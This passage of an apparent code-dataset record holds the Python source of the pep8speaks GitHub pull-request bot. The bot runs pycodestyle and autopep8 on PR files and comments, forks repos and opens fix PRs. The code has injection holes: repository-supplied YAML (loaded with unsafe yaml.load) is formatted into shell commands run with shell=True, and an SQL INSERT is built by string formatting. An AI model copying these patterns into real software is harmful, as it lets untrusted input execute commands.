file:\\n\\n\") comment_body.append(\"> \" +\"\".join(data[\"extra_results\"][file])) comment_body.append(\"---\\n\\n\") if config[\"only_mention_files_with_errors\"] and not ERROR: comment_body.append(\"Cheers ! There are no PEP8 issues in this Pull Request.:beers: \") comment_body=''.join(comment_body) comment_footer=[] if request.json[\"action\"]==\"opened\": comment_footer.append(config[\"message\"][\"opened\"][\"footer\"]) elif request.json[\"action\"] in[\"synchronize\", \"reopened\"]: comment_footer.append(config[\"message\"][\"updated\"][\"footer\"]) comment_footer=''.join(comment_footer) return comment_header, comment_body, comment_footer, ERROR def comment_permission_check(data, comment): \"\"\"Check for quite and resume status or duplicate comments\"\"\" PERMITTED_TO_COMMENT=True repository=data[\"repository\"] headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) url=\"https://api.github.com/repos/{}/issues/{}/comments\" url=url.format(repository, str(data[\"pr_number\"])) comments=requests.get(url, headers=headers, auth=auth).json() last_comment=\"\" for old_comment in reversed(comments): if old_comment[\"user\"][\"id\"]==24736507: last_comment=old_comment[\"body\"] break \"\"\" text1=''.join(BeautifulSoup(markdown(comment)).findAll(text=True)) text2=''.join(BeautifulSoup(markdown(last_comment)).findAll(text=True)) if text1==text2.replace(\"submitting\", \"updating\"): PERMITTED_TO_COMMENT=False \"\"\" for old_comment in reversed(comments): if '@pep8speaks' in old_comment['body']: if 'resume' in old_comment['body'].lower(): break elif 'quiet' in old_comment['body'].lower(): PERMITTED_TO_COMMENT=False return PERMITTED_TO_COMMENT def create_or_update_comment(data, comment): comment_mode=None headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) query=\"https://api.github.com/repos/{}/issues/{}/comments\" query=query.format(data[\"repository\"], str(data[\"pr_number\"])) comments=requests.get(query, headers=headers, auth=auth).json() last_comment_id=None for old_comment in comments: if old_comment[\"user\"][\"id\"]==24736507: last_comment_id=old_comment[\"id\"] break if last_comment_id is None: response=requests.post(query, json={\"body\": comment}, headers=headers, auth=auth) data[\"comment_response\"]=response.json() else: utc_time=datetime.datetime.utcnow() time_now=utc_time.strftime(\"%B %d, %Y at %H:%M Hours UTC\") comment +=\"\\n\\n comment=comment.format(time_now) query=\"https://api.github.com/repos/{}/issues/comments/{}\" query=query.format(data[\"repository\"], str(last_comment_id)) response=requests.patch(query, json={\"body\": comment}, headers=headers, auth=auth) def autopep8(data, config): headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) r=requests.get(data[\"diff_url\"], headers=headers, auth=auth) patch=unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding) py_files={} for patchset in patch: if patchset.target_file[-3:]=='.py': py_file=patchset.target_file[1:] py_files[py_file]=[] for hunk in patchset: for line in hunk.target_lines(): if line.is_added: py_files[py_file].append(line.target_line_no) to_ignore=\",\".join(config[\"pycodestyle\"][\"ignore\"]) arg_to_ignore=\"\" if len(to_ignore) > 0: arg_to_ignore=\"--ignore \" +to_ignore for file in py_files: filename=file[1:] url=\"https://raw.githubusercontent.com/{}/{}/{}\" url=url.format(data[\"repository\"], data[\"sha\"], file) r=requests.get(url, headers=headers, auth=auth) with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix: file_to_fix.write(r.text) cmd='autopep8 file_to_fix.py --diff{arg_to_ignore}'.format( arg_to_ignore=arg_to_ignore) proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE) stdout, _=proc.communicate() data[\"diff\"][filename]=stdout.decode(r.encoding) data[\"diff\"][filename]=data[\"diff\"][filename].replace(\"file_to_check.py\", filename) data[\"diff\"][filename]=data[\"diff\"][filename].replace(\"\\\\\", \"\\\\\\\\\") url=\"https://github.com/{}/blob/{}{}\" data[filename +\"_link\"]=url.format(data[\"repository\"], data[\"sha\"], file) os.remove(\"file_to_fix.py\") def create_gist(data, config): \"\"\"Create gists for diff files\"\"\" REQUEST_JSON={} REQUEST_JSON[\"public\"]=True REQUEST_JSON[\"files\"]={} REQUEST_JSON[\"description\"]=\"In response to @{0}'s comment:{1}\".format( data[\"reviewer\"], data[\"review_url\"]) for file, diffs in data[\"diff\"].items(): if len(diffs) !=0: REQUEST_JSON[\"files\"][file.split(\"/\")[-1] +\".diff\"]={ \"content\": diffs } headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) url=\"https://api.github.com/gists\" res=requests.post(url, json=REQUEST_JSON, headers=headers, auth=auth).json() data[\"gist_response\"]=res data[\"gist_url\"]=res[\"html_url\"] def delete_if_forked(data): FORKED=False url=\"https://api.github.com/user/repos\" headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) r=requests.get(url, headers=headers, auth=auth) for repo in r.json(): if repo[\"description\"]: if data[\"target_repo_fullname\"] in repo[\"description\"]: FORKED=True r=requests.delete(\"https://api.github.com/repos/\" \"{}\".format(repo[\"full_name\"]), headers=headers, auth=auth) return FORKED def fork_for_pr(data): FORKED=False url=\"https://api.github.com/repos/{}/forks\" url=url.format(data[\"target_repo_fullname\"]) headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) r=requests.post(url, headers=headers, auth=auth) if r.status_code==202: data[\"fork_fullname\"]=r.json()[\"full_name\"] FORKED=True else: data[\"error\"]=\"Unable to fork\" return FORKED def update_fork_desc(data): url=\"https://api.github.com/repos/{}\".format(data[\"fork_fullname\"]) headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) r=requests.get(url, headers=headers, auth=auth) ATTEMPT=0 while(r.status_code !=200): time.sleep(5) r=requests.get(url, headers=headers, auth=auth) ATTEMPT +=1 if ATTEMPT > 10: data[\"error\"]=\"Forking is taking more than usual time\" break full_name=data[\"target_repo_fullname\"] author, name=full_name.split(\"/\") request_json={ \"name\": name, \"description\": \"Forked from @{}'s{}\".format(author, full_name) } r=requests.patch(url, data=json.dumps(request_json), headers=headers, auth=auth) if r.status_code !=200: data[\"error\"]=\"Could not update description of the fork\" def create_new_branch(data): url=\"https://api.github.com/repos/{}/git/refs/heads\" url=url.format(data[\"fork_fullname\"]) headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) sha=None r=requests.get(url, headers=headers, auth=auth) for ref in r.json(): if ref[\"ref\"].split(\"/\")[-1]==data[\"target_repo_branch\"]: sha=ref[\"object\"][\"sha\"] url=\"https://api.github.com/repos/{}/git/refs\" url=url.format(data[\"fork_fullname\"]) data[\"new_branch\"]=\"{}-pep8-patch\".format(data[\"target_repo_branch\"]) request_json={ \"ref\": \"refs/heads/{}\".format(data[\"new_branch\"]), \"sha\": sha, } r=requests.post(url, json=request_json, headers=headers, auth=auth) if r.status_code !=200: data[\"error\"]=\"Could not create new branch in the fork\" def autopep8ify(data, config): headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) r=requests.get(data[\"diff_url\"], headers=headers, auth=auth) patch=unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding) py_files={} for patchset in patch: if patchset.target_file[-3:]=='.py': py_file=patchset.target_file[1:] py_files[py_file]=[] for hunk in patchset: for line in hunk.target_lines(): if line.is_added: py_files[py_file].append(line.target_line_no) to_ignore=\",\".join(config[\"pycodestyle\"][\"ignore\"]) arg_to_ignore=\"\" if len(to_ignore) > 0: arg_to_ignore=\"--ignore \" +to_ignore for file in py_files: filename=file[1:] url=\"https://raw.githubusercontent.com/{}/{}/{}\" url=url.format(data[\"repository\"], data[\"sha\"], file) r=requests.get(url, headers=headers, auth=auth) with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix: file_to_fix.write(r.text) cmd='autopep8 file_to_fix.py{arg_to_ignore}'.format( arg_to_ignore=arg_to_ignore) proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE) stdout, _=proc.communicate() data[\"results\"][filename]=stdout.decode(r.encoding) os.remove(\"file_to_fix.py\") def commit(data): headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) fullname=data.get(\"fork_fullname\") for file, new_file in data[\"results\"].items(): url=\"https://api.github.com/repos/{}/contents/{}\" url=url.format(fullname, file) params={\"ref\": data[\"new_branch\"]} r=requests.get(url, params=params, headers=headers, auth=auth) sha_blob=r.json().get(\"sha\") params[\"path\"]=file content_code=base64.b64encode(new_file.encode()).decode(\"utf-8\") request_json={ \"path\": file, \"message\": \"Fix pep8 errors in{}\".format(file), \"content\": content_code, \"sha\": sha_blob, \"branch\": data.get(\"new_branch\"), } r=requests.put(url, json=request_json, headers=headers, auth=auth) def create_pr(data): headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) url=\"https://api.github.com/repos/{}/pulls\" url=url.format(data[\"target_repo_fullname\"]) request_json={ \"title\": \"Fix pep8 errors\", \"head\": \"pep8speaks:{}\".format(data[\"new_branch\"]), \"base\": data[\"target_repo_branch\"], \"body\": \"The changes are suggested by autopep8\", } r=requests.post(url, json=request_json, headers=headers, auth=auth) if r.status_code==201: data[\"pr_url\"]=r.json()[\"html_url\"] else: data[\"error\"]=\"Pull request could not be created\" ", "sourceWithComments": "# -*- coding: utf-8 -*-\n\nimport base64\nimport collections\nimport datetime\nimport hmac\nimport json\nimport os\nimport re\nimport subprocess\nimport time\n\nimport psycopg2\nimport requests\nimport unidiff\nimport yaml\nfrom flask import abort\n\n\ndef update_users(repository):\n    \"\"\"Update users of the integration in the database\"\"\"\n    if os.environ.get(\"OVER_HEROKU\", False) is not False:\n        # Check if repository exists in database\n        query = r\"INSERT INTO Users (repository, created_at) VALUES ('{}', now());\" \\\n                \"\".format(repository)\n\n        try:\n            cursor.execute(query)\n            conn.commit()\n        except psycopg2.IntegrityError:  # If already exists\n            conn.rollback()\n\n\ndef follow_user(user):\n    \"\"\"Follow the user of the service\"\"\"\n    headers = {\n        \"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"],\n        \"Content-Length\": \"0\",\n    }\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https://api.github.com/user/following/{}\"\n    url = url.format(user)\n    r = requests.put(url, headers=headers, auth=auth)\n\n\ndef update_dict(base, head):\n    \"\"\"\n    Recursively merge or update dict-like objects.\n    >>> update({'k1': 1}, {'k1': {'k2': {'k3': 3}}})\n\n    Source : http://stackoverflow.com/a/32357112/4698026\n    \"\"\"\n    for key, value in head.items():\n        if isinstance(base, collections.Mapping):\n            if isinstance(value, collections.Mapping):\n                base[key] = update_dict(base.get(key, {}), value)\n            else:\n                base[key] = head[key]\n        else:\n            base = {key: head[key]}\n    return base\n\n\ndef match_webhook_secret(request):\n    \"\"\"Match the webhook secret sent from GitHub\"\"\"\n    if os.environ.get(\"OVER_HEROKU\", False) is not False:\n        header_signature = request.headers.get('X-Hub-Signature')\n        if header_signature is None:\n            abort(403)\n        sha_name, signature = header_signature.split('=')\n        if sha_name != 'sha1':\n            abort(501)\n        mac = hmac.new(os.environ[\"GITHUB_PAYLOAD_SECRET\"].encode(), msg=request.data,\n                       digestmod=\"sha1\")\n        if not hmac.compare_digest(str(mac.hexdigest()), str(signature)):\n            abort(403)\n    return True\n\n\ndef check_pythonic_pr(data):\n    \"\"\"\n    Return True if the PR contains at least one Python file\n    \"\"\"\n    files = list(get_files_involved_in_pr(data).keys())\n    pythonic = False\n    for file in files:\n        if file[-3:] == '.py':\n            pythonic = True\n            break\n\n    return pythonic\n\n\ndef get_config(data):\n    \"\"\"\n    Get .pep8speaks.yml config file from the repository and return\n    the config dictionary\n    \"\"\"\n\n    # Default configuration parameters\n    config = {\n        \"message\": {\n            \"opened\": {\n                \"header\": \"\",\n                \"footer\": \"\"\n            },\n            \"updated\": {\n                \"header\": \"\",\n                \"footer\": \"\"\n            }\n        },\n        \"scanner\": {\"diff_only\": False},\n        \"pycodestyle\": {\n            \"ignore\": [],\n            \"max-line-length\": 79,\n            \"count\": False,\n            \"first\": False,\n            \"show-pep8\": False,\n            \"filename\": [],\n            \"exclude\": [],\n            \"select\": [],\n            \"show-source\": False,\n            \"statistics\": False,\n            \"hang-closing\": False,\n        },\n        \"no_blank_comment\": True,\n        \"only_mention_files_with_errors\": True,\n    }\n\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    # Configuration file\n    url = \"https://raw.githubusercontent.com/{}/{}/.pep8speaks.yml\"\n\n    url = url.format(data[\"repository\"], data[\"after_commit_hash\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    if r.status_code == 200:\n        try:\n            new_config = yaml.load(r.text)\n            # overloading the default configuration with the one specified\n            config = update_dict(config, new_config)\n        except yaml.YAMLError:  # Bad YAML file\n            pass\n\n    # Create pycodestyle command line arguments\n    arguments = []\n    confs = config[\"pycodestyle\"]\n    for key, value in confs.items():\n        if value:  # Non empty\n            if isinstance(value, int):\n                if isinstance(value, bool):\n                    arguments.append(\"--{}\".format(key))\n                else:\n                    arguments.append(\"--{}={}\".format(key, value))\n            elif isinstance(value, list):\n                arguments.append(\"--{}={}\".format(key, ','.join(value)))\n    config[\"pycodestyle_cmd_config\"] = ' {arguments}'.format(arguments=' '.join(arguments))\n\n    # pycodestyle is case-sensitive\n    config[\"pycodestyle\"][\"ignore\"] = [e.upper() for e in list(config[\"pycodestyle\"][\"ignore\"])]\n\n    return config\n\n\ndef get_files_involved_in_pr(data):\n    \"\"\"\n    Return a list of file names modified/added in the PR\n    \"\"\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    diff_headers = headers.copy()\n    diff_headers[\"Accept\"] = \"application/vnd.github.VERSION.diff\"\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    repository = data[\"repository\"]\n    after_commit_hash = data[\"after_commit_hash\"]\n    author = data[\"author\"]\n    diff_url = \"https://api.github.com/repos/{}/pulls/{}\"\n    diff_url = diff_url.format(repository, str(data[\"pr_number\"]))\n    r = requests.get(diff_url, headers=diff_headers, auth=auth)\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    files = {}\n\n    for patchset in patch:\n        file = patchset.target_file[1:]\n        files[file] = []\n        for hunk in patchset:\n            for line in hunk.target_lines():\n                if line.is_added:\n                    files[file].append(line.target_line_no)\n\n    return files\n\n\ndef get_python_files_involved_in_pr(data):\n    files = get_files_involved_in_pr(data)\n    for file in list(files.keys()):\n        if file[-3:] != \".py\":\n            del files[file]\n\n    return files\n\n\ndef run_pycodestyle(data, config):\n    \"\"\"\n    Run pycodestyle script on the files and update the data\n    dictionary\n    \"\"\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    repository = data[\"repository\"]\n    after_commit_hash = data[\"after_commit_hash\"]\n    author = data[\"author\"]\n\n    # Run pycodestyle\n    ## All the python files with additions\n    # A dictionary with filename paired with list of new line numbers\n    py_files = get_python_files_involved_in_pr(data)\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https://raw.githubusercontent.com/{}/{}/{}\"\n        url = url.format(repository, after_commit_hash, file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_check.py\", 'w+', encoding=r.encoding) as file_to_check:\n            file_to_check.write(r.text)\n\n        # Use the command line here\n        cmd = 'pycodestyle {config[pycodestyle_cmd_config]} file_to_check.py'.format(\n            config=config)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"extra_results\"][filename] = stdout.decode(r.encoding).splitlines()\n\n        # Put only relevant errors in the data[\"results\"] dictionary\n        data[\"results\"][filename] = []\n        for error in list(data[\"extra_results\"][filename]):\n            if re.search(\"^file_to_check.py:\\d+:\\d+:\\s[WE]\\d+\\s.*\", error):\n                data[\"results\"][filename].append(error.replace(\"file_to_check.py\", filename))\n                data[\"extra_results\"][filename].remove(error)\n\n        ## Remove errors in case of diff_only = True\n        ## which are caused in the whole file\n        for error in list(data[\"results\"][filename]):\n            if config[\"scanner\"][\"diff_only\"]:\n                if not int(error.split(\":\")[1]) in py_files[file]:\n                    data[\"results\"][filename].remove(error)\n\n        ## Store the link to the file\n        url = \"https://github.com/{}/blob/{}{}\"\n        data[filename + \"_link\"] = url.format(repository, after_commit_hash, file)\n        os.remove(\"file_to_check.py\")\n\n\ndef prepare_comment(request, data, config):\n    \"\"\"Construct the string of comment i.e. its header, body and footer\"\"\"\n    author = data[\"author\"]\n    # Write the comment body\n    ## Header\n    comment_header = \"\"\n    if request.json[\"action\"] == \"opened\":\n        if config[\"message\"][\"opened\"][\"header\"] == \"\":\n            comment_header = \"Hello @\" + author + \"! Thanks for submitting the PR.\\n\\n\"\n        else:\n            comment_header = config[\"message\"][\"opened\"][\"header\"] + \"\\n\\n\"\n    elif request.json[\"action\"] in [\"synchronize\", \"reopened\"]:\n        if config[\"message\"][\"updated\"][\"header\"] == \"\":\n            comment_header = \"Hello @\" + author + \"! Thanks for updating the PR.\\n\\n\"\n        else:\n            comment_header = config[\"message\"][\"updated\"][\"header\"] + \"\\n\\n\"\n\n    ## Body\n    ERROR = False  # Set to True when any pep8 error exists\n    comment_body = []\n    for file, issues in data[\"results\"].items():\n        if len(issues) == 0:\n            if not config[\"only_mention_files_with_errors\"]:\n                comment_body.append(\n                    \" - There are no PEP8 issues in the\"\n                    \" file [`{0}`]({1}) !\".format(file, data[file + \"_link\"]))\n        else:\n            ERROR = True\n            comment_body.append(\n                \" - In the file [`{0}`]({1}), following \"\n                \"are the PEP8 issues :\\n\".format(file, data[file + \"_link\"]))\n            for issue in issues:\n                ## Replace filename with L\n                error_string = issue.replace(file + \":\", \"Line \")\n\n                ## Link error codes to search query\n                error_string_list = error_string.split(\" \")\n                code = error_string_list[2]\n                code_url = \"https://duckduckgo.com/?q=pep8%20{0}\".format(code)\n                error_string_list[2] = \"[{0}]({1})\".format(code, code_url)\n\n                ## Link line numbers in the file\n                line, col = error_string_list[1][:-1].split(\":\")\n                line_url = data[file + \"_link\"] + \"#L\" + line\n                error_string_list[1] = \"[{0}:{1}]({2}):\".format(line, col, line_url)\n                error_string = \" \".join(error_string_list)\n                error_string = error_string.replace(\"Line [\", \"[Line \")\n                comment_body.append(\"\\n> {0}\".format(error_string))\n\n        comment_body.append(\"\\n\\n\")\n        if len(data[\"extra_results\"][file]) > 0:\n            comment_body.append(\" - Complete extra results for this file :\\n\\n\")\n            comment_body.append(\"> \" + \"\".join(data[\"extra_results\"][file]))\n            comment_body.append(\"---\\n\\n\")\n\n    if config[\"only_mention_files_with_errors\"] and not ERROR:\n        comment_body.append(\"Cheers ! There are no PEP8 issues in this Pull Request. :beers: \")\n\n\n    comment_body = ''.join(comment_body)\n\n\n    ## Footer\n    comment_footer = []\n    if request.json[\"action\"] == \"opened\":\n        comment_footer.append(config[\"message\"][\"opened\"][\"footer\"])\n    elif request.json[\"action\"] in [\"synchronize\", \"reopened\"]:\n        comment_footer.append(config[\"message\"][\"updated\"][\"footer\"])\n\n    comment_footer = ''.join(comment_footer)\n\n    return comment_header, comment_body, comment_footer, ERROR\n\n\ndef comment_permission_check(data, comment):\n    \"\"\"Check for quite and resume status or duplicate comments\"\"\"\n    PERMITTED_TO_COMMENT = True\n    repository = data[\"repository\"]\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    # Check for duplicate comment\n    url = \"https://api.github.com/repos/{}/issues/{}/comments\"\n    url = url.format(repository, str(data[\"pr_number\"]))\n    comments = requests.get(url, headers=headers, auth=auth).json()\n\n    # Get the last comment by the bot\n    last_comment = \"\"\n    for old_comment in reversed(comments):\n        if old_comment[\"user\"][\"id\"] == 24736507:  # ID of @pep8speaks\n            last_comment = old_comment[\"body\"]\n            break\n\n    \"\"\"\n    # Disabling this because only a single comment is made per PR\n    text1 = ''.join(BeautifulSoup(markdown(comment)).findAll(text=True))\n    text2 = ''.join(BeautifulSoup(markdown(last_comment)).findAll(text=True))\n    if text1 == text2.replace(\"submitting\", \"updating\"):\n        PERMITTED_TO_COMMENT = False\n    \"\"\"\n\n    # Check if the bot is asked to keep quiet\n    for old_comment in reversed(comments):\n        if '@pep8speaks' in old_comment['body']:\n            if 'resume' in old_comment['body'].lower():\n                break\n            elif 'quiet' in old_comment['body'].lower():\n                PERMITTED_TO_COMMENT = False\n\n\n    return PERMITTED_TO_COMMENT\n\n\ndef create_or_update_comment(data, comment):\n    comment_mode = None\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    query = \"https://api.github.com/repos/{}/issues/{}/comments\"\n    query = query.format(data[\"repository\"], str(data[\"pr_number\"]))\n    comments = requests.get(query, headers=headers, auth=auth).json()\n\n    # Get the last comment id by the bot\n    last_comment_id = None\n    for old_comment in comments:\n        if old_comment[\"user\"][\"id\"] == 24736507:  # ID of @pep8speaks\n            last_comment_id = old_comment[\"id\"]\n            break\n\n    if last_comment_id is None:  # Create a new comment\n        response = requests.post(query, json={\"body\": comment}, headers=headers, auth=auth)\n        data[\"comment_response\"] = response.json()\n    else:  # Update the last comment\n        utc_time = datetime.datetime.utcnow()\n        time_now = utc_time.strftime(\"%B %d, %Y at %H:%M Hours UTC\")\n        comment += \"\\n\\n##### Comment last updated on {}\"\n        comment = comment.format(time_now)\n\n        query = \"https://api.github.com/repos/{}/issues/comments/{}\"\n        query = query.format(data[\"repository\"], str(last_comment_id))\n        response = requests.patch(query, json={\"body\": comment}, headers=headers, auth=auth)\n\n\ndef autopep8(data, config):\n    # Run pycodestyle\n\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(data[\"diff_url\"], headers=headers, auth=auth)\n    ## All the python files with additions\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    # A dictionary with filename paired with list of new line numbers\n    py_files = {}\n\n    for patchset in patch:\n        if patchset.target_file[-3:] == '.py':\n            py_file = patchset.target_file[1:]\n            py_files[py_file] = []\n            for hunk in patchset:\n                for line in hunk.target_lines():\n                    if line.is_added:\n                        py_files[py_file].append(line.target_line_no)\n\n    # Ignore errors and warnings specified in the config file\n    to_ignore = \",\".join(config[\"pycodestyle\"][\"ignore\"])\n    arg_to_ignore = \"\"\n    if len(to_ignore) > 0:\n        arg_to_ignore = \"--ignore \" + to_ignore\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https://raw.githubusercontent.com/{}/{}/{}\"\n        url = url.format(data[\"repository\"], data[\"sha\"], file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix:\n            file_to_fix.write(r.text)\n\n        cmd = 'autopep8 file_to_fix.py --diff {arg_to_ignore}'.format(\n            arg_to_ignore=arg_to_ignore)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"diff\"][filename] = stdout.decode(r.encoding)\n\n        # Fix the errors\n        data[\"diff\"][filename] = data[\"diff\"][filename].replace(\"file_to_check.py\", filename)\n        data[\"diff\"][filename] = data[\"diff\"][filename].replace(\"\\\\\", \"\\\\\\\\\")\n\n        ## Store the link to the file\n        url = \"https://github.com/{}/blob/{}{}\"\n        data[filename + \"_link\"] = url.format(data[\"repository\"], data[\"sha\"], file)\n        os.remove(\"file_to_fix.py\")\n\n\ndef create_gist(data, config):\n    \"\"\"Create gists for diff files\"\"\"\n    REQUEST_JSON = {}\n    REQUEST_JSON[\"public\"] = True\n    REQUEST_JSON[\"files\"] = {}\n    REQUEST_JSON[\"description\"] = \"In response to @{0}'s comment : {1}\".format(\n        data[\"reviewer\"], data[\"review_url\"])\n\n    for file, diffs in data[\"diff\"].items():\n        if len(diffs) != 0:\n            REQUEST_JSON[\"files\"][file.split(\"/\")[-1] + \".diff\"] = {\n                \"content\": diffs\n            }\n\n    # Call github api to create the gist\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https://api.github.com/gists\"\n    res = requests.post(url, json=REQUEST_JSON, headers=headers, auth=auth).json()\n    data[\"gist_response\"] = res\n    data[\"gist_url\"] = res[\"html_url\"]\n\n\ndef delete_if_forked(data):\n    FORKED = False\n    url = \"https://api.github.com/user/repos\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    for repo in r.json():\n        if repo[\"description\"]:\n            if data[\"target_repo_fullname\"] in repo[\"description\"]:\n                FORKED = True\n                r = requests.delete(\"https://api.github.com/repos/\"\n                                \"{}\".format(repo[\"full_name\"]),\n                                headers=headers, auth=auth)\n    return FORKED\n\n\ndef fork_for_pr(data):\n    FORKED = False\n    url = \"https://api.github.com/repos/{}/forks\"\n    url = url.format(data[\"target_repo_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.post(url, headers=headers, auth=auth)\n    if r.status_code == 202:\n        data[\"fork_fullname\"] = r.json()[\"full_name\"]\n        FORKED = True\n    else:\n        data[\"error\"] = \"Unable to fork\"\n    return FORKED\n\n\ndef update_fork_desc(data):\n    # Check if forked (takes time)\n    url = \"https://api.github.com/repos/{}\".format(data[\"fork_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    ATTEMPT = 0\n    while(r.status_code != 200):\n        time.sleep(5)\n        r = requests.get(url, headers=headers, auth=auth)\n        ATTEMPT += 1\n        if ATTEMPT > 10:\n            data[\"error\"] = \"Forking is taking more than usual time\"\n            break\n\n    full_name = data[\"target_repo_fullname\"]\n    author, name = full_name.split(\"/\")\n    request_json = {\n        \"name\": name,\n        \"description\": \"Forked from @{}'s {}\".format(author, full_name)\n    }\n    r = requests.patch(url, data=json.dumps(request_json), headers=headers, auth=auth)\n    if r.status_code != 200:\n        data[\"error\"] = \"Could not update description of the fork\"\n\n\ndef create_new_branch(data):\n    url = \"https://api.github.com/repos/{}/git/refs/heads\"\n    url = url.format(data[\"fork_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    sha = None\n    r = requests.get(url, headers=headers, auth=auth)\n    for ref in r.json():\n        if ref[\"ref\"].split(\"/\")[-1] == data[\"target_repo_branch\"]:\n            sha = ref[\"object\"][\"sha\"]\n\n    url = \"https://api.github.com/repos/{}/git/refs\"\n    url = url.format(data[\"fork_fullname\"])\n    data[\"new_branch\"] = \"{}-pep8-patch\".format(data[\"target_repo_branch\"])\n    request_json = {\n        \"ref\": \"refs/heads/{}\".format(data[\"new_branch\"]),\n        \"sha\": sha,\n    }\n    r = requests.post(url, json=request_json, headers=headers, auth=auth)\n\n    if r.status_code != 200:\n        data[\"error\"] = \"Could not create new branch in the fork\"\n\n\ndef autopep8ify(data, config):\n    # Run pycodestyle\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(data[\"diff_url\"], headers=headers, auth=auth)\n\n    ## All the python files with additions\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    # A dictionary with filename paired with list of new line numbers\n    py_files = {}\n\n    for patchset in patch:\n        if patchset.target_file[-3:] == '.py':\n            py_file = patchset.target_file[1:]\n            py_files[py_file] = []\n            for hunk in patchset:\n                for line in hunk.target_lines():\n                    if line.is_added:\n                        py_files[py_file].append(line.target_line_no)\n\n    # Ignore errors and warnings specified in the config file\n    to_ignore = \",\".join(config[\"pycodestyle\"][\"ignore\"])\n    arg_to_ignore = \"\"\n    if len(to_ignore) > 0:\n        arg_to_ignore = \"--ignore \" + to_ignore\n\n    for file in py_files:\n        filename = file[1:]\n        url = 